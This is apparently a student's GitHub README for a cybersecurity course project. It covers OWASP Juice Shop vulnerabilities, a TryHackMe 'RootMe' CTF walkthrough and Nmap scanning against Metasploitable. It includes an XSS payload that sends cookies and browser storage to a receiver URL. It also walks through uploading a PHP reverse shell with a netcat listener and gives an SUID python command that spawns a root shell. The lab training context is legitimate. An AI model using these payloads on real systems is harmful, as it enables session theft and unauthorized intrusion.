# project2
## Description:
This project focuses on practical cybersecurity training by exploring web application vulnerabilities, writing professional reports, solving Capture The Flag (CTF) challenges, and mastering network scanning. It includes hands-on tasks with OWASP Juice Shop and TryHackMe's "Root Me" CTF, enhancing both offensive and defensive skills. Additionally, it incorporates developing a custom Python-based Nmap tool, fostering scripting and network analysis expertise.

**Assessment Methods:**

**Practical Exploration:**

**Identifying and documenting at least 5 vulnerabilities in OWASP Juice Shop.**

**Rooting a machine in the "Root Me" CTF.**

**Tool Proficiency:**

**Running Nmap scans on the Metasploitable or CTF server to detect services and vulnerabilities.**

**Developing a custom Python-based Nmap scanner that performs similar functions.**

**Report Writing:**

**Submitting a well-structured vulnerability assessment report on Juice Shop findings.**

**Including analysis, impact, and mitigation for identified vulnerabilities.**

**Learning Methods:**

**Hands-on experimentation with OWASP Juice Shop and TryHackMe challenges.**

**Guided and independent use of Nmap.**

**Python scripting for network analysis.**

**Research on professional report-writing techniques.**

## Requirements:

**Juice Shop** 

**Metasploitable**

**Burp Suite**

**TryHackMe account**

**Nmap**

**Gobuster**

**Metasploit**

**Python**
### Vulnerabilities in OWASP Juice Shop

**Steps to Install docker and Exploring OWASP Juice Shop Vulnerabilities**

**Install Docker**

```
sudo apt install docker.io
```

```
sudo su
```

``
usermod -aG docker {{user-anun}}
``

```
su {{user-anun}}
```

Run 
```
docker pull bkimminich/juice-shop
```

Run 
```
docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop
```

**Exposes port 3000 on your localhost, allowing you to access
Juice Shop via http://localhost:3000**

#### 1. SQL Injection
**About attack:** SQL Injection exploits improper handling of user inputs in SQL queries. If input fields or URL parameters are not properly sanitized or validated, attackers can inject malicious SQL code to manipulate the query.

**How it was detected:** 
Lets try to dump system with SQL prompts.
We have access to admin page, with some games of clicking buttons, we can find the mail of admin. Here it is.
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_03_08_45.png)
Login with the administration's user account.
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_03_11_10.png)
Access the administration section of the stor
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_03_14_12.png)

#### 2. Security Misconfiguration
Uploading leaks
in this page valide only images file  
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_04_51_36.png)
but we can upload other file too
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_04_52_28.png)
 for exampl .zip,pdf
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-02_11_29_25.png)
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-02_11_28_40.png)

#### 3. Broken Access Control
**Use boolean OR and write true expression. before login turn on burpsuite, catch traffic from proxy, throw repeater and click send.** 

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_14_50_16.png)


**Now get token from response part and use convertor for example https://jwt.io/**

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-05%2000-17-25.png)

**Now get hashing password,  use something algorithm for get true password, https://crackstation.net/  may be it weak...**

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-04%2023-53-05.png)

**Congratulations!!!**

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_15_02_45.png)
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_15_05_02.png)

#### 4. Cross-Site Scripting (XSS)

About attack: Cross-Site Scripting (XSS) is a type of security vulnerability in web applications where an attacker injects malicious scripts into trusted websites. These scripts run in the context of other users' browsers, potentially allowing the attacker to steal sensitive information like session cookies, manipulate website content, or perform unauthorized actions on behalf of the victim.

**There are many payloads for XSS attacks. Some of them can be found in the https://xss.js.org/**
The payload is 
```
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```
**Injecting JavaScript into input fields like search or feedback forms.**

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-05%2002-52-29.png)

payload can be 
```
<iframe src="javascript:fetch('http://localhost:5000/receiver', {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({cookies: document.cookie,localStorage: JSON.stringify(localStorage),sessionStorage: JSON.stringify(sessionStorage)})});"> </iframe>
```
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-05%2002-54-11.png))

#### 5. Find the Hidden Page


**Do not link this page directly in the app's navigation bar or footer.**

**From now on you will see the additional menu item Score Board in the navigation bar.**

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-05_16_52_37.png)

### RootMe CTF
#### 1. What is RootMe CTF?
**RootMe CTF is a Capture The Flag (CTF) challenge designed for beginners to test their hacking skills and gain hands-on experience with cybersecurity.**

The first step is to deploy the virtual machine. You can find it on [TryHackMe](https://tryhackme.com/room/rrootme). As it deploys, take note of the IP address assigned to your instance. If you want to work by vpn, need download vpn package and give some permission.
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-07%2021-28-57.png)
```
chmod +x [filename]
```
```
sudo openvpn [filename]
```
**sometime you need start mashin or see IP**
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-06_15_08_53.png)
 
#### 2. What tools are used in RootMe CTF?
In RootMe CTF, you’ll use tools like Nmap for scanning,Use GoBuster to discover hidden directories, generate or download reverse shell and various commands for privilege escalation.
```
nmap -sV [TARGET MACHINE IP]
```
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-07_10_54_46.png)
```
gobuster dir -u [MACHINE IP] -w [WORDLIST PATH]
```
**We discovered  that there is a hidden directory “/panel/”.**

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-07_10_22_26.png)
**We will proceed to investigate the directories discovered using Gobuster.**

**Now open the script in editor and change the $ip and $port to your host machine’s IP and port you want to listen on/my mashin ip/. Here i am keeping the default port which is “1234”. Now we have configured the script , rename the script using the command:**
```
mv php_reverse_shell.php php_reverse_shell.php5
```
 **We will proceed furthur and upload the script ``` http://<MACHINE_IP>/panel/```**
 
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-07_10_52_57.png)

The script has been uploaded successfully.

Moving on to the next step, we will initiate a listener using Netcat. I am using 1234 port which was already inserted in the script that we uploaded.

Run the command:
```
nc -lvnp <PORT>
```

**After that Execute the script by double-clicking it at  ```(http://<MACHINE_IP>/uploads/)``` and see uploads files 
Execute the script and check back to see your netcat listener.**
You will see that we have successfully gained the shell.

Now let’s search for the flag. We know that it is in user.txt as it is mentioned in the question.

Run the command 
```
find / -type f -name user.txt 2> /dev/null
```
and open the file: ```cat /var/www/user.txt```: 

#### 3. How can I escalate my privileges in RootMe CTF?
**SUID (Set User ID) is a special file permission in Linux and UNIX-like operating systems that allows a program to execute with the privileges of the file's owner, rather than the user running the program. It is used to enable ordinary users to perform tasks that typically require elevated privileges.**

To escalate privileges, you’ll need to find files with SUID permissions and then use a specific Python command to gain higher access.
**How SUID Works**

**When a file with the SUID bit set is executed, the process gets the file owner's privileges during execution.**

**The most common use case is programs that need to perform tasks as the root user, even when executed by a non-root user.**

**Checking for SUID Files**

**To list all files with the SUID bit set:**
```
find / -type f -user root -perm -4000 2>/dev/null
```
**We have the /usr/bin/python with SUID permission.**

Now we will try to escalate our privileges. Lets go to https://gtfobins.github.io/ and look for possible privilege escalation commands for elevating the privileges.
Search python in the search bar and choose “SUID”.
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
After running this command,type **whoami** to get confirmation that we indeed are a root user now.
Now,to find the root.txt run this command:
```
find / -type f -name root.txt
```
Then run:``` cat /root/root.txt```

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-07%2022-37-30.png)

### Running Nmap scans on the Metasploitable or CTF server to detect services and vulnerabilities

Assuming that we have already up our Metasploitable and Kali(or different environment for working).
IP know when writeing **ifconfig** on Metasploitable terminal /**eth0 192.168.10.41**/



**Nmap scans:**
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-07_17_01_58.png)
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-07_17_03_25.png)
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-07_17_04_13.png)
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-07_17_04_41.png)
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-07_17_05_02.png)
![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-07_17_05_44.png)

**Developing a custom Python-based Nmap scanner that performs similar functions**

My Nmap scanning on Metasploitable /**eth0 192.168.10.41**/

![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-08%2002-29-17.png)
